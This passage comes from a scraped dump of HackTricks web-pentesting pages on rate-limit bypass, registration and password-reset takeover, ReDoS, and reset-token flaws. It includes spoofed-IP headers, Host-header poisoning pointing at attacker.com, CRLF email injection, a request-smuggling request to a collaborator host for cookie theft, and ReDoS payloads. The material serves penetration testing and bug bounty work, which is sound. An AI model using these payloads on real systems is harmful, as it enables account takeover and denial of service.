Sockets\n.\nReferences\n‚Äã\nhttps://hackerone.com/reports/759247\n‚Äã\n‚Äã\nhttps://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html\n‚Äã\n‚Äã\nhttps://hackerone.com/reports/55140\n‚Äã\n‚Äã\nhttps://portswigger.net/research/smashing-the-state-machine\n‚Äã\n‚Äã\nhttps://portswigger.net/web-security/race-conditions\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nPentesting Web -\nPrevious\nProxy / WAF Protections Bypass\nNext\n- Pentesting Web\nRate Limit Bypass\nLast modified\n1mo ago"
    },
    {
        "title": "Rate Limit Bypass",
        "url": "https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass",
        "text": "Rate Limit Bypass\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUsing similar endpoints\nIf you are attacking the\n/api/v3/sign-up\nendpoint try to perform bruteforce to\n/Sing-up\n,\n/SignUp\n,\n/singup\n...\nAlso try appending to the original endpoint bytes like\n%00, %0d%0a, %0d, %0a, %09, %0C, %20\nBlank chars in code/params\nTry adding some blank byte like\n%00, %0d%0a, %0d, %0a, %09, %0C, %20\nto the code and/or params. For example\ncode=1234%0a\nor if you are requesting a code for an email and you only have 5 tries, use the 5 tries for\n[email¬†protected]\n, then for\n[email¬†protected]\n%0a\n, then for\n[email¬†protected]\n%0a%0a\n, and continue...\nChanging IP origin using headers\nX-Originating-IP:\n127.0\n.0.1\nX-Forwarded-For:\n127.0\n.0.1\nX-Remote-IP:\n127.0\n.0.1\nX-Remote-Addr:\n127.0\n.0.1\nX-Client-IP:\n127.0\n.0.1\nX-Host:\n127.0\n.0.1\nX-Forwared-Host:\n127.0\n.0.1\n‚Äã\n‚Äã\n#or use double X-Forwared-For header\nX-Forwarded-For:\nX-Forwarded-For:\n127.0\n.0.1\nIf they are limiting to 10 tries per IP, every 10 tries change the IP inside the header.\nChange other headers\nTry changing the user-agent, the cookies... anything that could be able to identify you.\nAdding extra params to the path\nIf the limit in in the path\n/resetpwd\n, try BFing that path, and once the rate limit is reached try\n/resetpwd?someparam=1\nLogin in your account before each attempt\nMaybe if you\nlogin into your account before each attempt\n(or each set of X tries), the rate limit is restarted. If you are attacking a login functionality, you can do this in burp using a Pitchfork attack in\nsetting your credentials every X tries\n(and marking follow redirects).\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nPentesting Web -\nPrevious\nRace Condition\nNext\n- Pentesting Web\nRegistration & Takeover Vulnerabilities\nLast modified\n2mo ago"
    },
    {
        "title": "Registration & Takeover Vulnerabilities",
        "url": "https://book.hacktricks.xyz/pentesting-web/registration-vulnerabilities",
        "text": "Registration & Takeover Vulnerabilities\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nRegistration Takeover\nDuplicate Registration\nTry to generate using an existing username\nCheck varying the email:\nuppsercase\n+1@\nadd some some in the email\nspecial characters in the email name (%00, %09, %20)\nPut black characters after the email:\n[email¬†protected]\na\n[email¬†protected]\n@attacker.com\n[email¬†protected]\n@gmail.com\nUsername Enumeration\nCheck if you can figure out when a username has already been registered inside the application.\nPassword Policy\nCreating a user check the password policy (check if you can use weak passwords).\nIn that case you may try to bruteforce credentials.\nSQL Injection\n‚Äã\nCheck this page\nto learn how to attempt account takeovers or extract information via\nSQL Injections\nin registry forms.\nOauth Takeovers\nOAuth to Account takeover\nSAML Vulnerabilities\nSAML Attacks\nChange Email\nwhen registered try to change the email and check if this change is correctly validated or can change it to arbitrary emails.\nMore Checks\nCheck if you can use\ndisposable emails\nLong\npassword\n(>200) leads to\nDoS\nCheck rate limits on account creation\nUse username@\nburp_collab\n.net and analyze the\ncallback\nPassword Reset Takeover\nPassword Reset Token Leak Via Referrer\n1.\nRequest password reset to your email address\n2.\nClick on the password reset link\n3.\nDon‚Äôt change password\n4.\nClick any 3rd party websites(eg: Facebook, twitter)\n5.\nIntercept the request in Burp Suite proxy\n6.\nCheck if the referer header is leaking password reset token.\nPassword Reset Poisoning\n1.\nIntercept the password reset request in Burp Suite\n2.\nAdd or edit the following headers in Burp Suite :\nHost: attacker.com\n,\nX-Forwarded-Host: attacker.com\n3.\nForward the request with the modified header\nhttp POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com\n4.\nLook for a password reset URL based on the\nhost header\nlike :\nhttps://attacker.com/reset-password.php?token=TOKEN\nPassword Reset Via Email Parameter\n# parameter pollution\nemail=victim@mail\n.\ncom&email=hacker@mail\n.\ncom\n‚Äã\n# array of emails\n{\n\"email\"\n:\n[\n\"\n[email¬†protected]\n\"\n,\n\"\n[email¬†protected]\n\"\n]}\n‚Äã\n# carbon copy\nemail=victim@mail\n.\ncom%0A%0Dcc:hacker@mail\n.\ncom\nemail=victim@mail\n.\ncom%0A%0Dbcc:hacker@mail\n.\ncom\n‚Äã\n# separator\nemail=victim@mail\n.\ncom\n,\nhacker@mail\n.\ncom\nemail=victim@mail\n.\ncom%20hacker@mail\n.\ncom\nemail=victim@mail\n.\ncom\n|\nhacker@mail\n.\ncom\nIDOR on API Parameters\n1.\nAttacker have to login with their account and go to the\nChange password\nfeature.\n2.\nStart the Burp Suite and Intercept the request\n3.\nSend it to the repeater tab and edit the parameters : User ID/email\npowershell POST /api/changepass [...] (\"form\": {\"email\":\"vic\n[email¬†protected]\n\",\"password\":\"securepwd\"})\nWeak Password Reset Token\nThe password reset token should be randomly generated and unique every time.\nTry to determine if the token expire or if it‚Äôs always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.\nTimestamp\nUserID\nEmail of User\nFirstname and Lastname\nDate of Birth\nCryptography\nNumber only\nSmall token sequence ( characters between [A-Z,a-z,0-9])\nToken reuse\nToken expiration date\nLeaking Password Reset Token\n1.\nTrigger a password reset request using the API/UI for a specific email e.g:\n[email¬†protected]\n2.\nInspect the server response and check for\nresetToken\n3.\nThen use the token in an URL like\nhttps://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]\nPassword Reset Via Username Collision\n1.\nRegister on the system with a username identical to the victim‚Äôs username, but with white spaces inserted before and/or after the username. e.g:\n\"admin \"\n2.\nRequest a password reset with your malicious username.\n3.\nUse the token sent to your email and reset the victim password.\n4.\nConnect to the victim account with the new password.\nThe platform CTFd was vulnerable to this attack.\nSee:\nCVE-2020-7245\n‚Äã\nAccount Takeover Via Cross Site Scripting\n1.\nFind an XSS inside the application or a subdomain if the cookies are scoped to the parent domain :\n*.domain.com\n2.\nLeak the current\nsessions cookie\n3.\nAuthenticate as the user using the cookie\nAccount Takeover Via HTTP Request Smuggling\n1. Use\nsmuggler\nto detect the type of HTTP Request Smuggling (CL, TE, CL.TE)\npowershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h\n2. Craft a request which will overwrite the\nPOST / HTTP/1.1\nwith the following data:\nGET http://something.burpcollaborator.net HTTP/1.1 X:\nwith the goal of open redirect the victims to burpcollab and steal their cookies\n3. Final request could look like the following\nGET / HTTP/1.1\nTransfer-Encoding: chunked\nHost: something.com\nUser-Agent: Smuggler/v1.0\nContent-Length: 83\n0\n‚Äã\nGET http://something.burpcollaborator.net  HTTP/1.1\nX: X\nHackerone reports exploiting this bug\n*\nhttps://hackerone.com/reports/737140\n*\nhttps://hackerone.com/reports/771666\n‚Äã\nAccount Takeover via CSRF\n1.\nCreate a payload for the CSRF, e.g: ‚ÄúHTML form with auto submit for a password change‚Äù\n2.\nSend the payload\nAccount Takeover via JWT\nJSON Web Token might be used to authenticate an user.\nEdit the JWT with another User ID / Email\nCheck for weak JWT signature\nJWT Vulnerabilities (Json Web Tokens)\nReferences\n‚Äã\nhttps://salmonsec.com/cheatsheet/account_takeover\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nRate Limit Bypass\nNext\n- Pentesting Web\nRegular expression Denial of Service - ReDoS\nLast modified\n6mo ago"
    },
    {
        "title": "Regular expression Denial of Service - ReDoS",
        "url": "https://book.hacktricks.xyz/pentesting-web/regular-expression-denial-of-service-redos",
        "text": "Regular expression Denial of Service - ReDoS\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nIntroduction\nCopied from\nhttps://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n‚Äã\nThe\nRegular expression Denial of Service (ReDoS)\nis a\nDenial of Service\nattack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time.\nDescription\nThe problematic Regex na√Øve algorithm\nThe Regular Expression na√Øve algorithm builds a\nNondeterministic Finite Automaton (NFA)\n, which is a finite state machine where for each pair of state and input symbol there may be several possible next states. Then the engine starts to make transition until the end of the input. Since there may be several possible next states, a deterministic algorithm is used. This algorithm tries one by one all the possible paths (if needed) until a match is found (or all the paths are tried and fail).\nFor example, the Regex\n^(a+)+$\nis represented by the following NFA:\nNondeterministic Finite Automaton\nFor the input\naaaaX\nthere are 16 possible paths in the above graph. But for\naaaaaaaaaaaaaaaaX\nthere are 65536 possible paths, and the number is double for each additional\na\n. This is an extreme case where the na√Øve algorithm is problematic, because it must pass on many many paths, and then fail.\nNotice, that not all algorithms are na√Øve, and actually Regex algorithms can be written in an efficient way. Unfortunately, most Regex engines today try to solve not only ‚Äúpure‚Äù Regexes, but also ‚Äúexpanded‚Äù Regexes with ‚Äúspecial additions‚Äù, such as back-references that cannot be always be solved efficiently (see\nPatterns for non-regular languages\nin\nWiki-Regex\nfor some more details). So even if the Regex is not ‚Äúexpanded‚Äù, a na√Øve algorithm is used.\nEvil Regexes\nA Regex is called ‚Äúevil‚Äù if it can stuck on crafted input.\nEvil Regex pattern contains\n:\nGrouping with repetition\nInside the repeated group:\nRepetition\nAlternation with overlapping\nExamples of Evil Patterns\n:\n(a+)+\n([a-zA-Z]+)*\n(a|aa)+\n(a|a?)+\n(.*a){x} for x \\> 10\nAll the above are susceptible to the input\naaaaaaaaaaaaaaaaaaaaaaaa!\n(The minimum input length might change slightly, when using faster or slower machines).\nReDoS Payloads\nString Exfiltration via ReDoS\nIn a CTF (or bug bounty) maybe you\ncontrol the Regex a sensitive information (the flag) is matched with\n. Then, if might be useful to make the\npage freeze (timeout or longer processing time)\nif the a\nRegex matched\nand\nnot if it didn't\n. This way you will be able to\nexfiltrate\nthe string\nchar by char\n:\nIn\nthis post\nyou can find this ReDoS rule:\n^(?=<flag>)((.*)*)*salt$\nExample:\n^(?=HTB{sOmE_fl¬ßN¬ß)((.*)*)*salt$\nIn\nthis writeup\nyou can find this one:\n<flag>(((((((.*)*)*)*)*)*)*)!\nIn\nthis writeup\nhe used:\n^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$\nReDoS Controlling Input and Regex\nThe following are\nReDoS\nexamples where you\ncontrol\nboth the\ninput\nand the\nregex\n:\nfunction\ncheck_time_regexp\n(\nregexp\n,\ntext\n){\nvar\nt0\n=\nnew\nDate\n().\ngetTime\n();;\nnew\nRegExp\n(\nregexp\n).\ntest\n(\ntext\n);\nvar\nt1\n=\nnew\nDate\n().\ngetTime\n();;\nconsole\n.\nlog\n(\n\"Regexp \"\n+\nregexp\n+\n\" took \"\n+\n(\nt1\n-\nt0\n)\n+\n\" milliseconds.\"\n)\n}\n‚Äã\n// This payloads work because the input has several \"a\"s\n[\n//  \"((a+)+)+$\",  //Eternal,\n//  \"(a?){100}$\", //Eternal\n\"(a|a?)+$\"\n,\n\"(\\\\w*)+$\"\n,\n//Generic\n\"(a*)+$\"\n,\n\"(.*a){100}$\"\n,\n\"([a-zA-Z]+)*$\"\n,\n//Generic\n\"(a+)*$\"\n,\n].\nforEach\n(\nregexp\n=>\ncheck_time_regexp\n(\nregexp\n,\n\"aaaaaaaaaaaaaaaaaaaaaaaaaa!\"\n))\n‚Äã\n/*\nRegexp (a|a?)+$ took 5076 milliseconds.\nRegexp (\\w*)+$ took 3198 milliseconds.\nRegexp (a*)+$ took 3281 milliseconds.\nRegexp (.*a){100}$ took 1436 milliseconds.\nRegexp ([a-zA-Z]+)*$ took 773 milliseconds.\nRegexp (a+)*$ took 723 milliseconds.\n*/\nTools\n‚Äã\nhttps://github.com/doyensec/regexploit\n‚Äã\n‚Äã\nhttps://devina.io/redos-checker\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nRegistration & Takeover Vulnerabilities\nNext\n- Pentesting Web\nReset/Forgotten Password Bypass\nLast modified\n6mo ago"
    },
    {
        "title": "Reset/Forgotten Password Bypass",
        "url": "https://book.hacktricks.xyz/pentesting-web/reset-password",
        "text": "Reset/Forgotten Password Bypass\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nThe following techniques recompilation was taken from\nhttps://anugrahsr.github.io/posts/10-Password-reset-flaws/\n‚Äã\nPassword Reset Token Leak Via Referrer\nThe\nHTTP referer\nis an optional HTTP header field that identifies the address of the webpage which is linked to the resource being requested. The Referer request header contains the address of the previous web page from which a link to the currently requested page was followed\nExploitation\nRequest password reset to your email address\nClick on the password reset link\nDont change password\nClick any 3rd party websites(eg: Facebook, twitter)\nIntercept the request in burpsuite proxy\nCheck if the referer header is leaking password reset token.\nImpact\nIt allows the person who has control of particular site to change the user‚Äôs password (CSRF attack), because this person knows reset password token of the user.\nReference:\nhttps://hackerone.com/reports/342693\nhttps://hackerone.com/reports/272379\nhttps://hackerone.com/reports/737042\nhttps://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a\nhttps://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1\nPassword Reset Poisoning\nIf you find a host header attack and it‚Äôs out of scope, try to find the password reset button!\nExploitation\nIntercept the password reset request in Burpsuite\nAdd following header or edit header in burpsuite(try one by one)\nHost: attacker.com\nHost: target.com\nX-Forwarded-Host: attacker.com\nHost: target.com\nHost: attacker.com\nCheck if the link to change the password inside the email is pointing to attacker.com\nPatch\nUse\n$_SERVER['SERVER_NAME']\nrather than\n$_SERVER['HTTP_HOST']\n$resetPasswordURL\n=\n\"https://\n{\n$_SERVER\n[\n'HTTP_HOST'\n]}\n/reset-password.php?token=12345678-1234-1234-1234-12345678901\"\n;\nImpact\nThe victim will receive the malicious link in their email, and, when clicked, will leak the user‚Äôs password reset link / token to the attacker, leading to full account takeover.\nReference:\nhttps://hackerone.com/reports/226659\nhttps://hackerone.com/reports/167631\nhttps://www.acunetix.com/blog/articles/password-reset-poisoning/\nhttps://pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/\nhttps://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87\nPassword Reset By Manipulating Email Parameter\nExploitation\nAdd attacker email as second parameter using &\nPOST\n/\nresetPassword\n[\n...\n]\nemail\n=\nvictim@email\n.\ncom\n&\nemail\n=\nattacker@email\n.\ncom\nAdd attacker email as second parameter using %20\nPOST\n/\nresetPassword\n[\n...\n]\nemail\n=\nvictim@email\n.\ncom\n%\n20\nemail\n=\nattacker@email\n.\ncom\nAdd attacker email as second parameter using |\nPOST\n/\nresetPassword\n[\n...\n]\nemail\n=\nvictim@email\n.\ncom\n|\nemail\n=\nattacker@email\n.\ncom\nAdd attacker email as second parameter using cc\nPOST\n/\nresetPassword\n[\n...\n]\nemail\n=\n\"\n[email¬†protected]\n%0a%0dcc:\n[email¬†protected]\n\"\nAdd attacker email as second parameter using bcc\nPOST\n/\nresetPassword\n[\n...\n]\nemail\n=\n\"\n[email¬†protected]\n%0a%0dbcc:\n[email¬†protected]\n\"\nAdd attacker email as second parameter using ,\nPOST\n/\nresetPassword\n[\n...\n]\nemail\n=\n\"\n[email¬†protected]\n\"\n,\nemail\n=\n\"\n[email¬†protected]\n\"\nAdd attacker email as second parameter in json array\nPOST\n/\nresetPassword\n[\n...\n]\n{\n\"email\"\n:[\n\"\n[email¬†protected]\n\"\n,\n\"\n[email¬†protected]\n\"\n]}\nReference\nhttps://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be\nhttps://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/\nhttps://twitter.com/HusseiN98D/status/1254888748216655872\nChanging Email And Password of any User through API Parameters\nExploitation\nAttacker have to login with their account and Go to the Change password function\nStart the Burp Suite and Intercept the request\nAfter intercepting the request sent it to repeater and modify parameters Email and Password\nPOST\n/\napi\n/\nchangepass\n[\n...\n]\n(\n\"form\"\n:\n{\n\"email\"\n:\n\"\n[email¬†protected]\n\"\n,\n\"password\"\n:\n\"12345678\"\n})\nReference\nhttps://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240\nNo Rate Limiting: Email Bombing\nExploitation\nStart the Burp Suite and Intercept the password reset request\nSend to intruder\nUse null payload\nReference\nhttps://hackerone.com/reports/280534\nhttps://hackerone.com/reports/794395\nFind out How Password Reset Token is Generated\nFigure out the pattern of password reset token\nIf it\nGenerated based Timestamp\nGenerated based on the UserID\nGenerated based on email of User\nGenerated based on Firstname and Lastname\nGenerated based on Date of Birth\nGenerated based on Cryptography\nUse Burp Sequencer to find the randomness or predictability of tokens.\nGuessable GUID\nThere are different types of GUIDs:\nVersion 0:\nOnly seen in the nil GUID (\"00000000-0000-0000-0000-000000000000\").\nVersion 1:\nThe GUID is generated in a predictable manner based on:\nThe current time\nA randomly generated \"clock sequence\" which remains constant between GUIDs during the uptime of the generating system\nA \"node ID\", which is generated based on the system's MAC address if it is available\nVersion 3:\nThe GUID is generated using an MD5 hash of a provided name and namespace.\nVersion 4:\nThe GUID is randomly generated.\nVersion 5:\nThe GUID is generated using a SHA1 hash of a provided name and namespace.\nIt's possible to take a look to a GUID and find out its version, there is a small tool for that:\nguidtool\n****\nguidtool -i 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c\nUUID version: 1\nUUID time: 2021-11-17 17:52:18.141000\nUUID timestamp: 138564643381410000\nUUID node: 17547390002044\nUUID MAC address: 0f:f5:91:f2:a3:7c\nUUID clock sequence: 3426\nIf the used version to generate a reset password GUID is the version 1, it's possible to bruteforce GUIDS:\nguidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000\na34aca00-47d0-11ec-8d62-0ff591f2a37c\na34af110-47d0-11ec-8d62-0ff591f2a37c\nReferences\n‚Äã\nhttps://www.intruder.io/research/in-guid-we-trust\n‚Äã\nResponse manipulation: Replace Bad Response With Good One\nLook for Request and Response like these\nHTTP\n/\n1.1\n401\nUnauthorized\n(\n‚Äúmessage‚Äù\n:\n‚Äùunsuccessful‚Äù\n,\n‚ÄùstatusCode\n:\n403\n,\n‚ÄùerrorDescription‚Äù\n:\n‚ÄùUnsuccessful‚Äù\n)\nChange Response\nHTTP\n/\n1.1\n200\nOK\n(\n‚Äúmessage‚Äù\n:\n‚Äùsuccess‚Äù\n,\n‚ÄùstatusCode\n:\n200\n,\n‚ÄùerrorDescription‚Äù\n:\n‚ÄùSuccess‚Äù\n)\nReference\nhttps://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3\nUsing Expired Token\nCheck if the expired token can be reused\nBrute Force Password Rest token\nTry to bruteforce the reset token using Burpsuite\nPOST\n/\nresetPassword\n[\n...\n]\nemail\n=\nvictim@email\n.\ncom\n&\ncode\n=\n$BRUTE\n$\nUse IP-Rotator on burpsuite to bypass IP based ratelimit.\nReference\nhttps://twitter.com/HusseiN98D/status/1254888748216655872/photo/1\nTry Using Your Token\nTry adding your password reset token with victim‚Äôs Account\nPOST\n/\nresetPassword\n[\n...\n]\nemail\n=\nvictim@email\n.\ncom\n&\ncode\n=\n$YOUR_TOKEN\n$\nReference\nhttps://twitter.com/HusseiN98D/status/1254888748216655872/photo/1\nSession I\nnvalidation\nin Logout/Password Reset\nWhen a user\nlogs out or reset his password\n, the current session should be invalidated.\nTherefore,\ngrab the cookies\nwhile the user is logged in,\nlog out\n, and\ncheck\nif the\ncookies\nare still\nvalid\n.\nRepeat the process\nchanging the password\ninstead of logging out.\nReset Token expiration Time\nThe\nreset tokens must have an expiration time\n, after it the token shouldn't be valid to change the password of a user.\nExtra Checks\nUse username@burp_collab.net and analyze the callback\nUser carbon copy\n[email¬†protected]\n%0a%0dcc:\n[email¬†protected]\nLong password (>200) leads to DoS\nAppend second email param and value\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nRegular expression Denial of Service - ReDoS\nNext\n- Pentesting Web\nSAML Attacks\nLast modified\n4mo ago"
    },
    {
        "title": "SAML Attacks",
        "url": "https://book.hacktricks.xyz/pentesting-web/saml-attacks",
